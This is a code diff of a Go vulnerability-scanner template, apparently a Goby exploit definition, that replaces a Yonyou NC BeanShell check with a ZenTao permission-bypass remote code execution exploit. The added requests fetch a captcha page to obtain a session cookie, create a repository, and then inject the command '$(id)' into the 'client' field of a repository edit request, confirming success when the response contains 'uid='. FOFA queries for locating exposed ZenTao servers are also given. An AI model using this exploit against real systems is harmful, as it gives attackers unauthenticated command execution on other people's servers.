@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "禅道权限绕过 RCE",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"易软天创-禅道系统\" || product=\"易软天创-禅道系统\"",
+  "GobyQuery": "app=\"易软天创-禅道系统\" || product=\"易软天创-禅道系统\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,11 +30,69 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/misc-captcha-user.html",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default"
+        },
         "data_type": "text",
         "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/repo-create.html",
+        "follow_redirect": true,
+        "header": {
+          "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "X-Requested-With": "XMLHttpRequest"
+        },
+        "data_type": "text",
+        "data": "product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid="
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/repo-edit-10000-10000.html",
+        "follow_redirect": true,
+        "header": {
+          "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "X-Requested-With": "XMLHttpRequest"
+        },
+        "data_type": "text",
+        "data": "SCM=Subversion&client=$(id)"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +109,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "uid=",
             "bz": ""
           }
         ]
@@ -107,7 +165,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "禅道权限绕过 RCE",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +174,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "zentao bypass rce",
       "Product": "",
       "Description": "",
       "Recommendation": "",
